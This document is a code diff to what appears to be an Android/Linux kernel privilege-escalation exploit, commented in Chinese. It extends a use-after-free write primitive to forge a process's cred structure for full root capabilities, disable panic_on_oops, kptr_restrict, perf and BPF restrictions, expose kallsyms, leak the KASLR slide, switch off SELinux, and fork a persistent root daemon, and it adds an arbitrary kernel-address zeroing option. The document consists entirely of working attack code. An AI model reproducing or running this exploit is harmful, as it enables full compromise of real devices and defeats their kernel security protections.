+        else STAGE_LOG("still uid=%u euid=%u",
+                       (unsigned)getuid(), (unsigned)geteuid());
     }
     if (!rooted) {
         STAGE_LOG("6 轮未能清零 uid/euid，提权失败");
         return -1;
+    }
+    caps = read_cap_eff(getpid());
+    STAGE_LOG("残血 root：uid=0 CapEff=%#" PRIx64, caps);
+
+    /* [E2] 写原语没命中时的回退：euid/fsuid 已为 0，写 sysctl 不需要 cap */
+    if (!caps)
+        defuse_panic_sysctl();
+
+    /* [E2.5] 顺手把 kallsyms 打开：拿到符号表就能校验 slide、脱离硬编码 */
+    if (!g_kallsyms_ok)
+        stage_expose_kallsyms();
+
+    /* [E3] 伪造整页 cred，把 cap_effective 补满 */
+    if (!caps) {
+        g_plant_cred = 1;
+        for (int attempt = 1; attempt <= 4 && !caps; attempt++) {
+            uint64_t ck;
+            STAGE_LOG("E3 第 %d/4 轮：伪造 cred 页", attempt);
+            g_cred_kva = 0;
+            if (one_uaf(0)) { STAGE_LOG("写 task->cred 未命中页，重试"); continue; }
+            ck = g_cred_kva;
+            if (!ck) { STAGE_LOG("页内 cred 地址未生成，重试"); continue; }
+            STAGE_LOG("task=%#" PRIx64 " -> cred=%#" PRIx64, g_task, ck);
+            log_sync();
+            g_plant_cred = 0;
+            if (one_uaf(ck + 8)) STAGE_LOG("清 cred+8 未命中页");
+            g_plant_cred = 1;
+            caps = read_cap_eff(getpid());
+            if (caps) {
+                STAGE_LOG("完整 root：uid=0 euid=0 CapEff=%#" PRIx64, caps);
+            } else {
+                STAGE_LOG("still uid=%u euid=%u CapEff=%#" PRIx64,
+                          (unsigned)getuid(), (unsigned)geteuid(), caps);
+            }
+        }
+        g_plant_cred = 0;
+    }
+
+    /* E3 成功后有了 CAP_SYS_ADMIN，E2.5 被拒的 sysctl 这次一定放行 */
+    if (!g_kallsyms_ok && caps)
+        stage_expose_kallsyms();
+
+    /* 成功的是主进程，cred_child 仍是 shell，rootd 由主进程拉起 */
+    if (caps && !g_rootd_forked) {
+        pid_t rd = fork();
+        if (rd == 0) { setpgid(0, 0); run_rootd(); _exit(0); }
+        g_rootd_forked = 1;
+        STAGE_LOG("主进程已 fork rootd pid=%d", (int)rd);
     }
     STAGE_LOG("子进程=%d 正在钉住页面（父进程 pid=%d）",
               (int)g_cred_child_pid, (int)getpid());
@@ -3413,6 +3848,15 @@ static void print_flow(const char *prog)
         "  --lmap-only              跑校准 A+B  -> C98260_PAGE_OFFSET\n"
         "  --cred-only              只探测 cred -> C98260_CRED_ADDR\n"
         "\n"
+        "  写零直通车（只写 0，不做别的）\n"
+        "  --poke 0x..              绝对地址写 0（kallsyms 里的值直接用）\n"
+        "  --poke-link 0x..         链接地址写 0（自动加 --slide）\n"
+        "  --poke-kptr              关 kptr_restrict + perf_event_paranoid\n"
+        "                           （地址取自 --profile 的 kallsyms）\n"
+        "  --poke-panic             关 panic_on_oops（含 panic_timeout）\n"
+        "                           （同上；画像缺符号时才回退 6.1.134）\n"
+        "  --poke-retry N           每个地址重试次数，默认 3（1..20）\n"
+        "\n"
         "  提权 / SELinux\n"
         "  --selinux-only           只关 SELinux，不提权、不起 KSU 和 shell\n"
         "  --skip-selinux-check     不判断当前 enforce，直接写 0\n"
@@ -3447,6 +3891,13 @@ int main(int argc, char **argv)
      * 扫全部 argv 而非只看 argv[1]，避免 --exec-ok 出现在其它位置时被
      * 当成未知参数。子进程必须立刻退出，否则会重跑整条利用链、毁掉
      * UAF 竞态窗口。 */
+    /* 守墓分支：exec 后本 task 的 timerqueue 已被写原语改坏，退出即 oops。
+     * 常驻 + SIGSTOP 让 group_dead 永不成立，清理路径永不执行。 */
+    for (int i = 1; i < argc; i++)
+        if (!strcmp(argv[i], "--exec-hold")) {
+            for (;;)
+                raise(SIGSTOP);
+        }
     for (int i = 1; i < argc; i++)
         if (!strcmp(argv[i], "--exec-ok")) _exit(0);
     color_init();       /* 按 env/TTY 定颜色，让参数解析期的错误也能带色 */
@@ -3483,6 +3934,33 @@ int main(int argc, char **argv)
         } else if (!strcmp(a, "--kaslr-only"))     g_kaslr_only = 1;
         else if (!strcmp(a, "--lmap-only"))        g_lmap_only = 1;
         else if (!strcmp(a, "--cred-only"))        g_cred_only = 1;
+        else if (!strcmp(a, "--poke") && i + 1 < argc) {
+            if (poke_add(strtoull(argv[++i], NULL, 0), POKE_ABS, "自定义绝对地址")) {
+                elog("--poke 最多 %d 个", MAX_POKES); return 1;
+            }
+        } else if (!strcmp(a, "--poke-link") && i + 1 < argc) {
+            if (poke_add(strtoull(argv[++i], NULL, 0), POKE_LINK, "自定义链接地址")) {
+                elog("--poke 最多 %d 个", MAX_POKES); return 1;
+            }
+        } else if (!strcmp(a, "--poke-kptr")) {
+            /* 两道门一起开：kptr_restrict 和 perf_event_paranoid。
+             * 地址来自 --profile 装载的画像（boot.img 里 kallsyms 的链接地址），
+             * 所以这里只记符号，不改地址——参数顺序里 --profile 可能还在后面。
+             * paranoid 写它所在的 8 字节槽：低 3 位清零后前 4 字节是
+             * unprivileged_bpf_disabled，一起清掉都是放宽方向。 */
+            if (poke_add(0, POKE_SYM_KPTR, "kptr_restrict") ||
+                poke_add(0, POKE_SYM_PARANOID, "perf_paranoid+bpf")) {
+                elog("--poke 最多 %d 个", MAX_POKES); return 1;
+            }
+        } else if (!strcmp(a, "--poke-panic")) {
+            if (poke_add(0, POKE_SYM_PANIC, "panic_on_oops")) {
+                elog("--poke 最多 %d 个", MAX_POKES); return 1;
+            }
+        } else if (!strcmp(a, "--poke-retry") && i + 1 < argc) {
+            g_poke_retry = atoi(argv[++i]);
+            if (g_poke_retry < 1)  g_poke_retry = 1;
+            if (g_poke_retry > 20) g_poke_retry = 20;
+        }
         else if (!strcmp(a, "--selinux-only"))     g_selinux_only = 1;
         else if (!strcmp(a, "--skip-selinux-check") ||
                  !strcmp(a, "--no-selinux-check") ||
@@ -3568,6 +4046,12 @@ int main(int argc, char **argv)
              "不能与 --page-offset 并用");
         return 1;
     }
+    /* poke 是独立终点（写完即退），与其它单步模式互斥 */
+    if (g_npoke && (g_kaslr_only || g_lmap_only || g_cred_only || g_selinux_only)) {
+        elog("--poke/--poke-kptr/--poke-panic 不能与 "
+             "--kaslr-only/--lmap-only/--cred-only/--selinux-only 并用");
+        return 1;
+    }
 
     LOG_V1("[verbose] 等级=%d（-v 调试 / -vv 详细 / -vvv 逐条）", g_verbose);
     LOG_V3("[verbose] 逐条模式：tracefs 成功写入与 order=1 原始样本行逐条打印");
@@ -3611,6 +4095,7 @@ int main(int argc, char **argv)
 
     /* [1] 校准 A：--slide 直接给值时标 skipped，避免误以为真的泄露过一次 */
     if (have_slide) {
+        g_slide_known = 1;
         emit_status("calib_a", "skipped");
         stage_skipped("校准 A (KASLR slide)");
     } else {
@@ -3633,6 +4118,7 @@ int main(int argc, char **argv)
                      "同尺寸分配较多时结果可能不是 cred", P.cred_size);
             disarm_all();
         } else {
+            g_slide_known = 1;
             emit_status("calib_a", "ok");
             stage_done("校准 A (KASLR slide)", NULL);
         }
@@ -3648,7 +4134,7 @@ int main(int argc, char **argv)
         disarm_all();
         LOG_LEAK("[leak] 仅泄露 KASLR slide：%#" PRIx64, g_slide);
         LOG_LEAK("[leak] 本次启动 _text ≈ %#" PRIx64,
-                 UINT64_C(0xffffffc080000000) + g_slide);
+                 UINT64_C(0xffffffc008000000) + g_slide);
         LOG_OK("[leak] 完整利用时可用：--slide %#" PRIx64, g_slide);
         /* marker：宿主解析用，必须保持纯文本，不着色 */
         dprintf(STDOUT_FILENO, "C98260_KASLR_ONLY_DONE=1\n");
@@ -3745,9 +4231,29 @@ int main(int argc, char **argv)
         return finish(b_rc ? 3 : 0);  /* 无基址命中时只退回画像默认值，不算成功 */
     }
 
+    /* ---- 写零直通车：--poke ---------------------------------------------
+     * 到这里 slide / page_offset 都已就位（实测或命令行给），只差写。
+     * 不 setsid、不 leak_task、不碰 SELinux、不提权；写完就退。
+     * 守墓进程留在 T 态被 init 收养——树已脏，收尸必 oops。 */
+    if (g_npoke) {
+        disarm_all();
+        emit_status("poke", "running");
+        stage_begin();
+        int prc = run_pokes();
+        stage_done("poke 写零", prc ? "有地址未命中" : NULL);
+        emit_status("poke", prc ? "failed" : "ok");
+        return finish(prc ? 6 : 0);
+    }
+
     /* 脱离宿主会话：UserService 解绑/退出时本进程与 rootd 要继续活着 */
     (void)setsid();
     emit_status("inject", "running");
+
+    /* [2.5] 先关 panic_on_oops：写原语直接清 .data，不依赖 root / SELinux。
+     * 放在 stage_c 之前，后续 oops 只杀当前 task，不会整机 panic。 */
+    stage_begin();
+    defuse_panic();
+    stage_done("关 panic_on_oops", g_panic_defused ? NULL : "写原语未命中");
 
     /* [3] 泄漏 task_struct；selinux-only 模式不需要它，也不留常驻进程 */
     if (!g_selinux_only) {
